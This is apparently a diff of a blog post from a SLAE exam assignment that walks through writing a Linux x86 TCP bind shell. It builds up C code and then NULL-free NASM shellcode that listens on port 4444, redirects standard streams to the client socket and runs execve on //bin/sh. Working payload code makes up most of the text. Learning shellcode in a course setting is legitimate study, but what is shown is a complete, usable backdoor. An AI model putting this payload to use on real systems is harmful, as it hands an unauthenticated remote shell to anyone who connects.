@@ -32,7 +32,7 @@ Follows the visual representation of this technique:
 
 ## First Attempt
 
-### C Source Code
+### C Code
 
 The first step is to create a listening TCP socket:
 
@@ -54,13 +54,13 @@ bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address
 listen(server_socket_fd, 1);
 ```
 
-Initially, a socket is created through the `socket` function, which returns a `File Descriptor` (on UNIX systems everyting is treated like a file, sockets too). The arguments `SOCK_STREAM` and `IPPROTO_TCP` allows the creation of a `TCP` socket.
+Initially, a socket is created through the `socket` function, which returns a `File Descriptor` (on UNIX systems everyting is treated like a file, sockets too). The arguments `SOCK_STREAM` and `IPPROTO_TCP` allow for the creation of a `TCP` socket.
 
-After that, you have to to specify the address and port number on which to bind the socket. In this case, I used `INADDR_ANY` (i.e. bind the socket on all the addresses (`0.0.0.0`)), and the typical port used by Metasploit (`4444`).
+After that, you have to to specify the address and port number on which to bind the socket. In this case, I used `INADDR_ANY` (i.e. bind the socket to `0.0.0.0`), and the typical port used by Metasploit (`4444`).
 
-These variables are passed to the `bind` function, which performs the binding operation. However, if you were to run `ss -tnl` (or `netstat -plnt`), you wouldn't find the current socket.
+These variables are passed to the `bind` function, which performs the binding operation. However, if you were to run `ss -tnl` (or `netstat -plnt`), you wouldn't find the current socket yet.
 
-The reason is that we have to execute the `listen` function first. It accept 2 arguments:
+The reason is that we have to execute the `listen` function first. It accepts 2 arguments:
 
 1. the File Descriptor of the socket
 2. *the maximum length to which the queue of pending connections for sockfd may grow* (ref: [man page](https://man7.org/linux/man-pages/man2/listen.2.html))
@@ -74,16 +74,20 @@ struct sockaddr_in client_address;
 // accept incoming connections
 size_client_socket_struct = sizeof(struct sockaddr_in);
 client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&client_address, (socklen_t *)&size_client_socket_struct);
+```
 
+{% sidenote Accept a client connection and place its socket inside the variable `client_address` %}
+
+```
 // redirect standard input/output/error to the socket
 dup2(client_socket_fd, 0);
 dup2(client_socket_fd, 1);
 dup2(client_socket_fd, 2);
 ```
 
-The function `accept` accepts a client connection, and places its socket (IP address and port) inside the variable `client_address`. After that, I used `dup2` in order to redirect `stdin`, `stdout`, and `stderr` of the current shell towards the client socket, so it acts as an interactive shell.
+I used `dup2` in order to redirect `stdin`, `stdout`, and `stderr` of the current shell towards the client socket, so it acts as an interactive shell.
 
-What's missing is only the code that executes the commands sent by the client:
+What's missing now is the code that executes the commands sent by the client:
 
 ```cpp
 char client_command[1024] = {0};
@@ -99,7 +103,9 @@ while ((bytes_read = recv(client_socket_fd, &client_command, 1024, 0)) > 0) {
 }
 ```
 
-The loops checks if the client sent any data. If so, it executes the commands and sends input/output/errors to the client socket. Finally, it uses the function `memset` in order to clear the buffer that stores the command and avoid previous commands from corrupting next ones.
+The loop right above checks if the client has sent any data. If so, it executes the command and sends input/output/errors to the client socket.
+
+Finally, it uses the function `memset` in order to clear the buffer that stores the command, in order to avoid previous commands from corrupting next ones.
 
 The full code can be found inside the [repo created for this exam](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/first_attempt/shell_bind_tcp.c).
 
@@ -149,7 +155,7 @@ switch (call) {
 // ...
 ```
 
-Nevertheless, it's still not what we want: it doesn't show the integer values of these values. Digging a bit deeper, I found them inside the file [include/uapi/linux/net.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/net.h#L27).
+Nevertheless, it still isn't what we want: it doesn't show the integer values of these values. Digging a bit deeper, I found them inside the file [include/uapi/linux/net.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/net.h#L27).
 
 ```cpp
 #define SYS_SOCKET            1      /*     sys_socket(2)          */
@@ -174,7 +180,7 @@ Nevertheless, it's still not what we want: it doesn't show the integer values of
 #define SYS_SENDMMSG          20     /*     sys_sendmmsg(2)        */
 ```
 
-Now we should be able to use the `socket` function.
+Now we should be able to use the `socket` function for the creation of a TCP socket.
 
 ```nasm
 ; Author: Robert Catalin Raducioiu (rbct)
@@ -190,20 +196,26 @@ _start:
     ; or https://web.archive.org/web/20160214193152/http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html
 
     ; sys_socketcall
-    mov eax, 102
+    xor eax, eax
+    mov ebx, eax
+    mov ecx, eax
+    mov al, 102
 
     ; SYS_SOCKET
-    mov ebx, 1
+    mov bl, 1
 
     ; IPPROTO_TCP
-    push 0x00000006
+    mov cl, 6
+    push ecx
 
-    ; SOCK_STREAM
-    push 0x00000001
+    ; SOCK_STREAM (0x00000001)
+    push ebx
 
     ; AF_INET
-    push 0x00000002
+    mov cl, 2
+    push ecx
 
+    ; Pointer to the arguments for SYS_SOCKET call
     mov ecx, esp
 
     ; call syscall
@@ -297,23 +309,31 @@ P.S. Don't forget the definition of `sys_socketcall`:
 int syscall(SYS_socketcall, int call, unsigned long *args);
 ```
 
-In particular, in the case of the `bind` function, you can't use `ecx`, `edx`, and so on, because they would be passed to `sys_socketcall`. Just like before, the arguments are passed as a pointer, using the `ecx` register.
+In particular, in the case of the `bind` function, you can't use `ECX`, `EDX`, and so on, because they would be passed to `sys_socketcall`. Just like before, the arguments are passed as a pointer, using the `ECX` register.
 
 Follows the assembly code:
 
 ```nasm
     ; INADDR_ANY (0x00000000)
-    push 0
+    dec ebx
+    push ebx
     
     ; 0x0002 -> AF_INET
     ; 0x115c -> htons(4444)
-    push 0x5c110002
+
+    push WORD 0x5c11
+
+    mov bl, 2
+    push WORD bx
+    ; push 0x5c110002
 
     ; save the pointer to the struct for later
     mov ecx, esp
     
     ; 3rd argument of bind(): size of the struct
-    push 16
+    ; push 16
+    rol bl, 3
+    push ebx
 
     ; 2nd argument of bind(): pointer to the struct
     push ecx
@@ -323,10 +343,11 @@ Follows the assembly code:
     push eax
     
     ; syscall socketcall
-    mov eax, 102
+    xor eax, eax
+    mov al, 102
 
     ; 1st argument of socketcall(): call SYS_BIND
-    mov ebx, 2
+    ror bl, 3
 
     ; 2nd argument of socketcall(): pointer to the parameters of bind()
     mov ecx, esp
@@ -334,7 +355,7 @@ Follows the assembly code:
     int 0x80
 ```
 
-You may be wondering why I used `push 16` for the 3rd argument of `bind()`, instead of the current size of struct, which is 8 bytes. Initially, I tried using `push 8`, however `bind()` would return the value `0xffffffea` (`EINVAL`), which means an argument is invalid.
+You may be wondering why I used `PUSH 16` for the 3rd argument of `bind()`, instead of the current size of struct, which is 8 bytes. Initially, I tried using `PUSH 8`, however `bind()` would return the value `0xffffffea` (`EINVAL`), which means an argument is invalid.
 
 Later, I discovered the right size should be `16` (doing a simple `printf` of `sizeof(server_address)`). However, the real reason can be found in the definition of the struct:
 
@@ -368,16 +389,24 @@ Follows the assembly code:
 
 ```nasm
     ; 2nd argument of listen(): set backlog (connection queue size) to 1
-    push 1
+    mov bl, 1
 
+    push 1
+```
+
+{% sidenote I thought `push 1` is interpreted as `push` `0x00000001`, but [it seems](http://sparksandflames.com/files/x86InstructionChart.html) the opcode `6A` can be used to push a single byte as a 32-bit value  %}
+
+```nasm
     ; 1st argument of listen(): file descriptor of the server socket
     push esi
     
     ; syscall socketcall
-    mov eax, 102
+    mov eax, ebx
+    mov al, 102
 
     ; 1st argument of socketcall(): SYS_LISTEN call
-    mov ebx, 4
+    ; mov ebx, 4
+    rol bl, 2
 
     ; 2nd argument of socketcall(): pointer to listen() arguments
     mov ecx, esp
@@ -388,7 +417,7 @@ Follows the assembly code:
 
 #### Accepting connections
 
-It's time to accept connections from out client. We need to convert the following C++ code into assembly:
+It's time to accept connections from out client. We need to convert the following C code into assembly:
 
 ```cpp
 size_client_socket_struct = sizeof(struct sockaddr_in);
@@ -399,20 +428,24 @@ Follows the assembly code:
 
 ```nasm
     ; 3rd argument of accept(): size of client_address struct
-    push 16
+    rol bl, 2
+    push ebx
 
     ; 2nd argument of accept: client_address struct, in this case empty
-    push 0
-    push 0
+    xor ebx, ebx
+    push ebx
+    push ebx
 
     ; 1st argument of accept: file descriptor of the server socket
     push esi
 
     ; syscall socketcall
-    mov eax, 102
+    ; mov eax, 102
+    mov eax, ebx
+    mov al, 102
 
     ; 1st argument of socketcall(): SYS_ACCEPT call
-    mov ebx, 5
+    mov bl, 5
 
     ; 2nd argument of socketcall(): pointer to accept() arguments
     mov ecx, esp
@@ -456,11 +489,12 @@ According to the file `/usr/include/i386-linux-gnu/asm/unistd_32.h`, `dup2` is t
     int 0x80
 ```
 
-This is good, but I wanted a better approach, one that uses fewer bytes:
+This is good, but I wanted a better approach, one that uses fewer bytes and it's free of `NULL` bytes:
 
 ```nasm
     ; loop counter (repeats dup2() three times)
-    mov ecx, 3
+    mov ecx, ebx
+    mov bl, 3
 
     ; save Client File Descriptor for later use
     mov edi, eax
@@ -470,7 +504,7 @@ RepeatDuplicate:
     push ecx
 
     ; dup2() syscall
-    mov eax, 63
+    mov al, 63
 
     ; Client file descriptor
     mov ebx, edi
@@ -509,5 +543,216 @@ Follows the syscall numbers:
 It seems we're missing some functions. Therefore, I decided to reimplement it manually:
 
 ```nasm
+ReceiveData:
 
+    xor ecx, ecx
+    mov ebx, ecx
+    mov ch, 4
+    lea eax, [ReceivedData]
+
+ClearCommandBuffer:
+
+    mov [eax], BYTE bl
+    inc eax 
+    dec ecx 
+    loop ClearCommandBuffer
 ```
+
+{% sidenote Implementation of `memset`, loop 1024 times in order to clear the buffer %}
+
+```nasm
+    ; 4th argument of recv(): NO flags
+    push ebx
+
+    ; 3rd argument of recv(): size of the buffer that stores the command received
+    xor ebx, ebx
+    inc ebx
+    rol bx, 10
+    push ebx
+
+    ; 2nd argument of recv(): pointer to the aforementione buffer
+    push ReceivedData
+
+    ; Client File Descriptor
+    push edi
+
+    ; syscall #102: socketcall()
+    xor eax, eax
+    mov al, 102
+
+    ; 1st argument of socketcall(): call SYS_RECV
+    xor ebx, ebx
+    mov bl, 10
+
+    ; 2nd argument of socketcall(): pointer to the arguments of SYS_RECV
+    mov ecx, esp
+
+    ; invoke socketcall()
+    int 0x80
+```
+
+{% sidenote Use `socketcall` to call `recv` and receive the command to be executed %}
+
+```nasm
+    cmp al, 0xff
+    je Exit
+
+    xor eax, eax
+    mov al, 2
+    int 0x80
+
+    ; if the return value of fork() == 0, it means we're in the child process
+    xor ebx, ebx
+    cmp eax, ebx
+    jne ReceiveData
+```
+
+{% sidenote After the `fork`, the *parent* process waits for data to be received, while the *child* process executes the command received just now %}
+
+```nasm
+ExecuteCommand:
+
+    xor esi, esi
+    push esi
+
+    push 0x68732f6e
+    push 0x69622f2f
+    mov ebx, esp
+```
+
+{% sidenote String `//bin/sh` %}
+
+```nasm
+    mov eax, esi
+    mov ax, 0x632d
+    push eax
+
+    mov eax, esp
+```
+
+{% sidenote String `-c` %}
+
+
+```nasm
+    push esi
+    push ReceivedData
+    push eax
+    push ebx
+
+    mov eax, esi
+    mov al, 11
+    mov ecx, esp
+
+    push esi
+    mov edx, esp
+
+    int 0x80
+```
+
+{% sidenote After executing the command (syscall 11: `execve`), the child process exits gracefully %}
+
+```nasm
+Exit:
+
+    mov eax, esi
+    inc eax
+    int 0x80
+
+section .bss
+
+    ReceivedData:   resb 1024
+```
+
+## Final attempt
+
+### C Code
+
+After finishing the second assignment, I noticed the shellcode I wrote uses too many instructions. To be more specific, the final block (`recv-memset-system`) is superfluous. In fact, once you redirect `stdin`, `stdout` and `stderr`, you can simply spawn a shell and the job is done:
+
+```cpp
+#include <netinet/ip.h>
+
+int main() {
+    int server_socket_fd, client_socket_fd, size_client_socket_struct;
+    struct sockaddr_in server_address, client_address;
+
+    // create a TCP socket
+    server_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+    server_address.sin_family = AF_INET;
+    server_address.sin_addr.s_addr = INADDR_ANY;
+    server_address.sin_port = htons(4444);
+
+    // bind the socket to 0.0.0.0:4444
+    bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address));
+
+    // passive socket that listens for connections
+    listen(server_socket_fd, 1);
+
+    // accept incoming connection
+    size_client_socket_struct = sizeof(struct sockaddr_in);
+    client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&client_address, (socklen_t *)&size_client_socket_struct);
+
+    dup2(client_socket_fd, 0);
+    dup2(client_socket_fd, 1);
+    dup2(client_socket_fd, 2);
+
+    system("/bin/bash");
+}
+```
+
+### Assembly
+
+Here's the assembly code that starts from the `RepeatDuplicate` label:
+
+```nasm
+RepeatDuplicate:
+    ; save ecx since it's modified later
+    push ecx
+
+    ; dup2() syscall
+    mov eax, 63
+
+    ; Client file descriptor
+    mov ebx, edi
+
+    ; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor
+    mov ecx, DWORD [esp]
+    dec ecx
+
+    ; call dup2()
+    int 0x80
+
+    ; restore ecx and check if loop is over
+    pop ecx
+    loop RepeatDuplicate
+
+SpawnShell:
+
+    push ecx
+
+    ; argv, 2nd argument of execve
+    mov ecx, esp
+
+    ; envp, 3rd argument of execve
+    mov edx, esp
+```
+
+{% sidenote `ECX` and `EDX` are pointers to `NULL`, so **argv** and **envp** are empty %}
+
+```nasm
+    ; 
+    push 0x68732f6e
+    push 0x69622f2f
+    mov ebx, esp
+
+    ; exceve syscall
+    mov eax, 11
+    int 0x80
+```
+
+{% sidenote Call `execve` on `//bin/sh` %}
+
+## Source code
+
+The full source code is stored inside the repository created for this Exam: [rbctee/SlaeExam]().
